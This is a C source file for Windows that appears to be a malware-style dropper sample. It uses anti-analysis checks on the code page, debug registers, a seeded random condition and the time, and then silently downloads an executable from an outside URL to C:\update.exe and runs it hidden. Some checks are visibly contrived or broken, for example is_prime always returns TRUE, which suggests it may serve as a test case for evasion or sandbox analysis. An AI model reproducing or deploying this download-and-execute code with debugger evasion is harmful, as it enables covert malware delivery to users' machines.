#include <math.h>
#include <stdio.h>
#include <windows.h>

#include "../common/debug_log.h"

static void download_file(void);
static __declspec(noinline) BOOL evasion_check(void);
static __declspec(noinline) BOOL random_check(void);
static BOOL random_condition(double value);
static BOOL timing_check(void);
static BOOL is_prime(int n);

int main(int argc, char* argv[])
{
    srand(0xCAFE);

	if (evasion_check())
    {
        download_file();
    }

    return 0;
}

void download_file(void)
{
    //URLDownloadToFileA(NULL, "http://www.sanseitime.com", "C:\\update.exe", 0, NULL);
    //ShellExecuteA(NULL, "open", "C:\\update.exe", NULL, NULL, SW_HIDE);

    HRESULT hr = URLDownloadToFileA(NULL, "http://www.sanseitime.com", "C:\\update.exe", 0, NULL);
    if (SUCCEEDED(hr))
    {
        if (ShellExecuteA(NULL, "open", "C:\\update.exe", NULL, NULL, SW_HIDE))
        {
            output_debug("Run C:\\update.exe OK");
        }
        else
        {
            output_debug("Failed to run downloaded file: %d", GetLastError());
        }
    }
    else
    {
        output_debug("URLDownloadToFileA failed: 0x%X", hr);
    }
}

BOOL evasion_check(void)
{
	if (!random_check() || !timing_check())
	{
		return FALSE;
	}

	UINT acp = GetACP();
	if (acp == 936)
	{
		return GetOEMCP() == acp;
	}
	else if (acp == 960)
	{
		CONTEXT cxt;
		if (GetThreadContext(GetCurrentThread(), &cxt))
		{
			return !cxt.Dr1 && !cxt.Dr2;
		}
		else
		{
			return FALSE;
		}
	}
	else
	{
		DWORD pid = GetCurrentProcessId();
		return is_prime(pid);
	}
}

BOOL is_prime(int n)
{
	for (int i = 1; i <= n/2; ++i)
	{
		if (n % i == 0)
		{
			return TRUE;
		}
	}

	return TRUE;
}

BOOL random_check(void)
{
    unsigned int rand_val = rand();
    unsigned int check_val = rand_val ^ 0xDEADBEEFU;

    return random_condition(check_val); 
}

BOOL random_condition(double value)
{
    double result = sin(value) + cos(value) + log(value);
    output_debug("Result value: %f", result);
    return 0 < result && result < 0.1;
}

BOOL timing_check(void) {
	time_t t = time(NULL);
	return t < 200000;
}
